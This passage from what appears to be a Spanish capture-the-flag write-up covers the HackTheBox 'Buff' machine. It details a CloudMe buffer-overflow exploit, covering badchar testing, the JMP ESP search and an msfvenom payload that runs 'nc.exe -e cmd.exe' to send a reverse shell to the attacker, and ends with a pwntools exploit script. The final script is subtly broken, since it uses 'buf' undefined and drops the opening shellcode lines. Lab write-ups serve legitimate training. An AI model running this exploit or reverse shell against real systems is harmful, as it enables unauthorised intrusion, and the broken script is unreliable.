</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>  <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>before_eip</span> <span class=o>+</span> <span class=n>eip</span> <span class=o>+</span> <span class=n>badchars</span>
</span></span><span class=line><span class=cl><span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>8888</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>Desde immunity debbuger podemos comprobar 1 a 1 si el carácter se muestra o no</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/buff/images/badchars_hu847eca501db700a0000dc091c66d34ad_5050_8fbf342c53446db46352a20002396f3b.webp 480w, /writeups/hackthebox/buff/images/badchars_hu847eca501db700a0000dc091c66d34ad_5050_5c84df0d49fb1b54a48ff57c2725e23b.webp 640w, /writeups/hackthebox/buff/images/badchars_hu847eca501db700a0000dc091c66d34ad_5050_012ed54f6e68ec2040d169b3f0ab20e1.webp 800w, /writeups/hackthebox/buff/images/badchars_hu847eca501db700a0000dc091c66d34ad_5050_f9715980bfd33aaec8bcf3d70c2817da.webp 1024w" fetchpriority=low height=900 id=h-rh-i-5 src=/writeups/hackthebox/buff/images/badchars_hu847eca501db700a0000dc091c66d34ad_5050_937e51ea199a0c4f058a0a37bffb5442.webp width=1600></p><p>Esto es un tostón, por eso antes hemos instalado mona.py, que como dije antes nos serviría para automatizar procesos</p><p>Empezamos con mona configurando el directorio de trabajo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona config -set workingfolder C:<span class=se>\U</span>sers<span class=se>\a</span>rnau<span class=se>\D</span>esktop<span class=se>\b</span>of
</span></span></code></pre></div><p>Seguimos creando una cadena de bytes para comprobar los badchars, pero excluimos el \x00 (Null byte) porque siempre da problemas</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona bytearray -b <span class=s2>&#34;\x00&#34;</span>
</span></span></code></pre></div><p>Dentro de la carpeta que hemos configurado como &ldquo;workingfolder&rdquo; han aparecido dos archivos. Dentro del bytearray.txt tenemos la misma cadena de caracteres que hemos configurado antes, así que no nos va a hacer falta modificar el script. El archivo que vamos a usar es el bytearray.bin.</p><pre tabindex=0><code>!mona compare -f C:\Users\arnau\Desktop\bof\bytearray.bin -a 0022F930
</code></pre><p>Este comando lo que va a hacer es comprobar si los caracteres se muestran bien, o dan algún problema. Con el parámetro -a tenemos que especificar la dirección del ESP donde hemos puesto la cadena de bytes para comprobar los badchars. Después de ejecutarlo se abre la siguiente ventana, donde dice que no hay ningún badchar, lo que significa que todos se muestran y se procesan de forma exitosa.</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/buff/images/bad2_hu8fb023d6c8bf10b9ff58ab350fbfc4a3_18442_0702545774aedac9cfe9c3e65d8b6993.webp 480w, /writeups/hackthebox/buff/images/bad2_hu8fb023d6c8bf10b9ff58ab350fbfc4a3_18442_8b5bb149bd19bddf28ebb8cffbc8e345.webp 640w, /writeups/hackthebox/buff/images/bad2_hu8fb023d6c8bf10b9ff58ab350fbfc4a3_18442_4793227bbf777dc5aa3a003bbaa90abd.webp 800w, /writeups/hackthebox/buff/images/bad2_hu8fb023d6c8bf10b9ff58ab350fbfc4a3_18442_6a92970e8118796073c31ffb3ef7a7ab.webp 1024w" fetchpriority=low height=900 id=h-rh-i-6 src=/writeups/hackthebox/buff/images/bad2_hu8fb023d6c8bf10b9ff58ab350fbfc4a3_18442_7e19715d61a068eb16ef81e38c7af139.webp width=1600></p><h5 id=protecciones>Protecciones<a href=#protecciones class=anchor aria-hidden=true>#</a></h5><p>Listamos todos los módulos para ver las protecciones que tienen</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona modules
</span></span></code></pre></div><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/buff/images/modules_hu39ea6c30a7c39004059f798b5b6b72a5_47838_e3e97d68c16bda8c6fdc5fca79dd88c7.webp 480w, /writeups/hackthebox/buff/images/modules_hu39ea6c30a7c39004059f798b5b6b72a5_47838_540e210ad6a1696908cbfcba720d76b4.webp 640w, /writeups/hackthebox/buff/images/modules_hu39ea6c30a7c39004059f798b5b6b72a5_47838_347400d97c389a61c9c6641b7b9de4ff.webp 800w, /writeups/hackthebox/buff/images/modules_hu39ea6c30a7c39004059f798b5b6b72a5_47838_5ed98fca220150a7e6a4c0394e14f8ca.webp 1024w" fetchpriority=low height=900 id=h-rh-i-7 src=/writeups/hackthebox/buff/images/modules_hu39ea6c30a7c39004059f798b5b6b72a5_47838_9c55a5bdd94cbeca11dc5b5709fbfbce.webp width=1600></p><details><summary>Tipos de protecciones</summary><table><thead><tr><th>Nombre</th><th>Descripción</th></tr></thead><tbody><tr><td>CANARY (Stack Canary)</td><td>Es una técnica de seguridad que se utiliza para detectar desbordamientos de búfer. Un &ldquo;canario&rdquo; es un valor colocado antes de la información sensible en la memoria y si este valor cambia, indica que la memoria ha sido alterada, lo que sugiere un intento de ataque.</td></tr><tr><td>CANARY (Stack Canary)</td><td>Es una técnica de seguridad que se utiliza para detectar desbordamientos de búfer. Un &ldquo;canario&rdquo; es un valor colocado antes de la información sensible en la memoria y si este valor cambia, indica que la memoria ha sido alterada, lo que sugiere un intento de ataque.</td></tr><tr><td>FORTIFY (Fortify Source)</td><td>Es una característica de seguridad en compiladores y bibliotecas de C que ayuda a proteger contra vulnerabilidades de desbordamiento de búfer y otros problemas de seguridad. Esta característica agrega comprobaciones de seguridad automáticas al código durante la compilación.</td></tr><tr><td>NX (No-eXecute)</td><td>Es una tecnología de hardware y una característica de seguridad que ayuda a prevenir la ejecución de código en regiones de memoria designadas como datos. Esto es útil para prevenir ataques de inyección de código, como los ataques de desbordamiento de búfer.</td></tr><tr><td>PIE (Position Independent Executable)</td><td>Es una técnica de seguridad que compila un ejecutable de manera que su carga en memoria sea aleatoria, lo que dificulta la explotación de vulnerabilidades por parte de los atacantes al no poder predecir la ubicación exacta del código en la memoria.</td></tr><tr><td>RELRO (RELocation Read-Only)</td><td>Es una técnica de seguridad que marca ciertas secciones de la tabla de enlace dinámico (DT) como de solo lectura después de que el enlazador ha resuelto todas las direcciones. Esto ayuda a proteger contra ataques que intentan modificar la tabla de enlace dinámico para redirigir el flujo de control del programa.</td></tr></tbody></table></details><br><p>De todos los .dll que salen de CloudMe interesan los que tienen todas las protecciones en False.</p><h5 id=jmp-esp>JMP ESP<a href=#jmp-esp class=anchor aria-hidden=true>#</a></h5><p>Entre todos los .dll que salen en false buscamos si tienen un JMP ESP (Una dirección que salte al ESP, que es donde vamos a poner el shellcode), es importante que tenga {PAGE_EXECUTE_READ}, para poder ejecutar nuestro shellcode</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona find -s <span class=s2>&#34;\xFF\xE4&#34;</span> -m Qt5Core.dll
</span></span></code></pre></div><p>Después de una búsqueda entre los .dll al final el Qt5Core.dll cumple con las características</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/buff/images/modules2_huff65419f4228ada7fd9d2c40662b01b9_28373_c8642b079c994270c96b8281f91138be.webp 480w, /writeups/hackthebox/buff/images/modules2_huff65419f4228ada7fd9d2c40662b01b9_28373_d5a48b2508838edfcbda51e2d323c3f9.webp 640w, /writeups/hackthebox/buff/images/modules2_huff65419f4228ada7fd9d2c40662b01b9_28373_7b52545a43304caca2f59813e73cc02e.webp 800w, /writeups/hackthebox/buff/images/modules2_huff65419f4228ada7fd9d2c40662b01b9_28373_e4dc930bfdc1f3fe07c53100de9ee3e6.webp 1024w" fetchpriority=low height=900 id=h-rh-i-8 src=/writeups/hackthebox/buff/images/modules2_huff65419f4228ada7fd9d2c40662b01b9_28373_67db1d4d6232e6a905577eaeb14209f6.webp width=1600></p><p>Ya tenemos la dirección para saltar al ESP: 0x68a98a6b</p><h5 id=shellcode>ShellCode<a href=#shellcode class=anchor aria-hidden=true>#</a></h5><p>Ahora toca crear el shellcode, que va a ejecutar lo siguiente <code>\\192.168.1.135\smb\nc.exe -e cmd.exe 192.168.1.135 443</code> en la máquina víctima, y nos mandara una shell a nuestra máquina de atacante.</p><pre tabindex=0><code>msfvenom -a x86 -p windows/exec CMD=&#39;\\192.168.1.135\smb\nc.exe -e cmd.exe 192.168.1.135 443&#39; -b &#39;\x00&#39; -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 267 (iteration=0)
x86/shikata_ga_nai chosen with final size 267
Payload size: 267 bytes
Final size of python file: 1332 bytes
buf =  b&#34;&#34;
buf += b&#34;\xdb\xc8\xd9\x74\x24\xf4\x5b\xba\x12\xf3\x19\x43&#34;
buf += b&#34;\x29\xc9\xb1\x3d\x31\x53\x17\x03\x53\x17\x83\xd1&#34;
buf += b&#34;\xf7\xfb\xb6\x29\x1f\x79\x38\xd1\xe0\x1e\xb0\x34&#34;
buf += b&#34;\xd1\x1e\xa6\x3d\x42\xaf\xac\x13\x6f\x44\xe0\x87&#34;
buf += b&#34;\xe4\x28\x2d\xa8\x4d\x86\x0b\x87\x4e\xbb\x68\x86&#34;
buf += b&#34;\xcc\xc6\xbc\x68\xec\x08\xb1\x69\x29\x74\x38\x3b&#34;
buf += b&#34;\xe2\xf2\xef\xab\x87\x4f\x2c\x40\xdb\x5e\x34\xb5&#34;
buf += b&#34;\xac\x61\x15\x68\xa6\x3b\xb5\x8b\x6b\x30\xfc\x93&#34;
buf += b&#34;\x68\x7d\xb6\x28\x5a\x09\x49\xf8\x92\xf2\xe6\xc5&#34;
buf += b&#34;\x1a\x01\xf6\x02\x9c\xfa\x8d\x7a\xde\x87\x95\xb9&#34;
buf += b&#34;\x9c\x53\x13\x59\x06\x17\x83\x85\xb6\xf4\x52\x4e&#34;
buf += b&#34;\xb4\xb1\x11\x08\xd9\x44\xf5\x23\xe5\xcd\xf8\xe3&#34;
buf += b&#34;\x6f\x95\xde\x27\x2b\x4d\x7e\x7e\x91\x20\x7f\x60&#34;
buf += b&#34;\x7a\x9c\x25\xeb\x97\xc9\x57\xb6\xfd\x0c\xe5\xcd&#34;
buf += b&#34;\xb0\x0f\xf5\xcd\xe4\x67\xc4\x46\x6b\xff\xd9\x8d&#34;
buf += b&#34;\xcf\x0f\x90\x8f\x66\x98\x7d\x5a\x3b\xc5\x7d\xb1&#34;
buf += b&#34;\x78\xf0\xfd\x33\x01\x07\x1d\x36\x04\x43\x99\xab&#34;
buf += b&#34;\x74\xdc\x4c\xcb\x2b\xdd\x44\x97\x97\x10\x5e\x15&#34;
buf += b&#34;\x06\x62\x96\x61\x78\xb5\xf8\xa0\xb7\x80\x58\xb1&#34;
buf += b&#34;\xda\x88\x3c\x5b\x46\x63\xd8\xdb\xed\x5b\x0f\x7e&#34;
buf += b&#34;\xce\xf8\x22\xe4\x20\x9a\xc4\x81\x1c\x55\x0c\x7b&#34;
buf += b&#34;\x73\xa4\x58\x43\xa5\xf7\x8a\x82\x8a\xc2\xf2\xd0&#34;
buf += b&#34;\xd8\x1f\xf3&#34;
</code></pre><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-a x86</td><td>Especifica la arquitectura del objetivo, en este caso, x86.</td></tr><tr><td style=text-align:center>-p windows/exec</td><td>Selecciona el payload a utilizar, en este caso, windows/exec, que nos sirve para ejecutar comandos en la máquina víctima</td></tr><tr><td style=text-align:center>CMD=&rsquo;\192.168.1.135\smb\nc.exe -e cmd.exe 192.168.1.135 443</td><td>Define el comando a ejecutar por el payload</td></tr><tr><td style=text-align:center>-b &lsquo;\x00</td><td>Especifica los badchars para que msfvenom no los ponga en el shellcode, ya que no se van a interpretar</td></tr><tr><td style=text-align:center>-f python</td><td>Define el formato de salida del shell code, en este caso python para que podamos simplemente copiar el output y pegarlo en el script sin necesidad de adaptar nada</td></tr></tbody></table></details><br><h5 id=script-final>Script final<a href=#script-final class=anchor aria-hidden=true>#</a></h5><p>Para finalizar la explotación del buffer overflow creamos un script basándonos en toda la información que hemos ido recopilando a lo largo de la resolución</p><ul><li>&lsquo;A&rsquo; * 1052: Primero mandamos 1052 &lsquo;A&rsquo; para llegar al EIP</li><li>0x68a98a6b: Segimos con el valor del EIP, que le pondremos la dirección para saltar al ESP</li><li>&lsquo;ShellCode&rsquo;: Lo último que mandamos es el shellcode.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>pack</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>1052</span>
</span></span><span class=line><span class=cl><span class=n>before_eip</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>eip</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=mh>0x68a98a6b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xcc\xc6\xbc\x68\xec\x08\xb1\x69\x29\x74\x38\x3b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xe2\xf2\xef\xab\x87\x4f\x2c\x40\xdb\x5e\x34\xb5</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xac\x61\x15\x68\xa6\x3b\xb5\x8b\x6b\x30\xfc\x93</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x68\x7d\xb6\x28\x5a\x09\x49\xf8\x92\xf2\xe6\xc5</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x1a\x01\xf6\x02\x9c\xfa\x8d\x7a\xde\x87\x95\xb9</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x9c\x53\x13\x59\x06\x17\x83\x85\xb6\xf4\x52\x4e</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xb4\xb1\x11\x08\xd9\x44\xf5\x23\xe5\xcd\xf8\xe3</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x6f\x95\xde\x27\x2b\x4d\x7e\x7e\x91\x20\x7f\x60</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x7a\x9c\x25\xeb\x97\xc9\x57\xb6\xfd\x0c\xe5\xcd</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xb0\x0f\xf5\xcd\xe4\x67\xc4\x46\x6b\xff\xd9\x8d</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xcf\x0f\x90\x8f\x66\x98\x7d\x5a\x3b\xc5\x7d\xb1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x78\xf0\xfd\x33\x01\x07\x1d\x36\x04\x43\x99\xab</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x74\xdc\x4c\xcb\x2b\xdd\x44\x97\x97\x10\x5e\x15</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x06\x62\x96\x61\x78\xb5\xf8\xa0\xb7\x80\x58\xb1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xda\x88\x3c\x5b\x46\x63\xd8\xdb\xed\x5b\x0f\x7e</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xce\xf8\x22\xe4\x20\x9a\xc4\x81\x1c\x55\x0c\x7b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x73\xa4\x58\x43\xa5\xf7\x8a\x82\x8a\xc2\xf2\xd0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xd8\x1f\xf3</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>before_eip</span> <span class=o>+</span> <span class=n>eip</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>buf</span>
</span></span><span class=line><span class=cl><span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>8888</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>Antes de ejecutarlo hay que ponerse en escucha por el puerto 443</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>443</span>
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li><strong>n</strong>: Sirve para que no haga la resolución de DNS</li><li><strong>l</strong>: Habilitar modo escucha de netcat</li><li><strong>v</strong>: Verbose, modo detallado de netcat</li><li><strong>p</strong>: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha</li></ul></details><br><p>Y también hay que abrir un servidor con samba para compartir el <strong>nc.exe</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-smbserver smb <span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span> -smb2support
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li><strong>smb</strong>: Nombre del recurso compartido</li><li><strong>$(pwd)</strong>: Esto devuelve el directorio en el cual estamos, y imapcket-server comparte el contenido de la ruta especificada</li><li><strong>&ndash;smb2support</strong>: Habilita el soporte para el protocolo SMB2</li></ul></details><br><p>Ejecutamos el script y&mldr; ¡Recibimos la conexión!</p><p>Ahora solo falta, envés de poner nuestra ip poner la de la máquina Buff y listo, máquina completada</p><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/writeups/hackthebox/october/ class="stretched-link text-reset text-decoration-none">October</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/vulnhub/brainpan-1/ class="stretched-link text-reset text-decoration-none">Brainpan 1</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div></body></html>